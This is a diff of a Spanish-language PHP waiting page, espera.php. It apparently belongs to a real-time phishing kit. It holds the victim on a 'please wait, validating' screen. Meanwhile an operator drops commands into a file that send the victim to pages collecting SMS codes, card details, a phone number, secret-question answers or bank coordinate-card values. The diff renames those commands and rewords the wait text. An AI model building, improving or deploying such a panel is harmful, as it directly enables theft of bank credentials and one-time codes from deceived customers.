@@ -1,4 +1,5 @@
 <?php
+// ===== espera.php =====
 session_start();
 $usuario = $_SESSION['usuario'] ?? null;
 if (!$usuario) {
@@ -11,35 +12,42 @@ if (file_exists($archivo)) {
     $accion = trim(file_get_contents($archivo));
     unlink($archivo);
 
-    if (substr($accion, 0, strlen("/clave/")) === "/clave/") {
-        $pregunta = explode("/clave/", $accion)[1];
+    if (substr($accion, 0, strlen("/palabra clave/")) === "/palabra clave/") {
+        $pregunta = explode("/palabra clave/", $accion)[1];
         $_SESSION['pregunta'] = $pregunta;
         header("Location: pregunta.php");
         exit;
     }
 
-    if (substr($accion, 0, strlen("/etiquetas/")) === "/etiquetas/") {
-        $etiquetas = explode("/etiquetas/", $accion)[1];
+    if (substr($accion, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
+        $etiquetas = explode("/coordenadas etiquetas/", $accion)[1];
         $_SESSION['etiquetas'] = explode(",", $etiquetas);
         header("Location: coordenadas.php");
         exit;
     }
 
     switch ($accion) {
-        case "/v1":
-            header("Location: sms.php"); break;
-        case "/v1error":
-            header("Location: smserror.php"); break;
-        case "/n1":
-            header("Location: numero.php"); break;
-        case "/retry":
-            header("Location: index2.php"); break;
-        case "/inicio":
-            header("Location: index.php"); break;
-        case "/err1":
-            header("Location: index2.php"); break;
-        case "/form":
-            header("Location: card.html"); break;
+        case "/SMS":
+            header("Location: sms.php");
+            break;
+        case "/SMSERROR":
+            header("Location: smserror.php");
+            break;
+        case "/NUMERO":
+            header("Location: numero.php");
+            break;
+        case "/ERROR":
+            header("Location: index2.php");
+            break;
+        case "/LOGIN":
+            header("Location: index.php");
+            break;
+        case "/LOGINERROR":
+            header("Location: index2.php");
+            break;
+        case "/CARD":
+            header("Location: card.html");
+            break;
     }
     exit;
 }
@@ -49,7 +57,7 @@ if (file_exists($archivo)) {
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="refresh" content="3">
-  <title>Validando...</title>
+  <title>Espere...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -79,8 +87,8 @@ if (file_exists($archivo)) {
   </style>
 </head>
 <body>
-  <h2>Estamos procesando tu solicitud…</h2>
-  <p class="subtexto">Por favor, mantené abierta esta ventana</p>
+  <h2>Por favor espera…</h2>
+  <p class="subtexto">Estamos validando tu solicitud, mantente en línea</p>
   <div class="loader"></div>
 </body>
 </html>
